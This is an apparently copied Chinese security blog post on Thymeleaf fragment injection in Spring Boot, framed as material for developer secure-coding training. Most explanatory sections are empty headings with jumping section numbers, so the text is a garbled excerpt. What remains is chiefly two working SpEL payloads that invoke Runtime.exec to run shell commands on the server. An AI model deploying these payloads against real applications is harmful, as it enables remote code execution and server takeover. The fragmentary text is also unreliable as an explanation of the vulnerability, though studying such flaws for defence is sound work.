> 原文链接: https://xz.aliyun.com/t/9826 


Thymeleaf Fragment 注入漏洞复现及新姿势扩展

最近需要给研发部门的开发GG们作一场关于Java安全编码的培训，一方面后端开发使用Springboot+thymeleaf框架较多，因此通过代码示例以及漏洞演示加深理解。借此机会，又再去学习了下大佬们关于Thymeleaf这个漏洞的研究。<br>
  本文针对已有payload的执行原理和过程在代码层面进行了一些分析，找出新的注入点并阐述扩展新payload的一些方法和姿势，仅此而已。另外由于Thymeleaf 介绍文章很多，就不赘述了，部分文章和观点给我提供了很多帮助，一并附在最后，就不一一致谢了，最后感谢你们的无私奉献yyds～。

# 0x01 环境配置

无一例外，我也是参考这个[https://github.com/veracode-research/spring-view-manipulation/](https://github.com/veracode-research/spring-view-manipulation/) 搭建的，核心代码如下：

```
*`{`new java.util.Scanner(Class.forName("java.lang.Runtime").getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]`{`"/bin/bash","-c","id"`}`).getInputStream()).next()`}`::x
```

# 0x03 关于为什么这里只能用 `__$`{`…`}`__` 而不能是 `$`{`expr`}`/$`{``{`expr`}``}``

# 0x11 环境配置(扩展）

# 0x13 Fragment 注入通用payload2

c)用$`{``{`expr`}``}` 方式：

```
*`{``{`new java.util.Scanner(Class.forName("java.lang.Runtime").getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]`{`"/bin/bash","-c","id"`}`).getInputStream()).next()`}``}`::x
```

# 0xFF 参考文献

[1]. [https://mp.weixin.qq.com/s/-KJijVbZGo6W7gLcve9IkQ](https://mp.weixin.qq.com/s/-KJijVbZGo6W7gLcve9IkQ)<br>
[2]. [https://github.com/veracode-research/spring-view-manipulation/](https://github.com/veracode-research/spring-view-manipulation/)<br>
[3]. [https://www.thymeleaf.org/doc/tutorials/3.0/thymeleafspring.html](https://www.thymeleaf.org/doc/tutorials/3.0/thymeleafspring.html)<br>
[4]. [https://www.cnblogs.com/hetianlab/p/13679645.html](https://www.cnblogs.com/hetianlab/p/13679645.html)
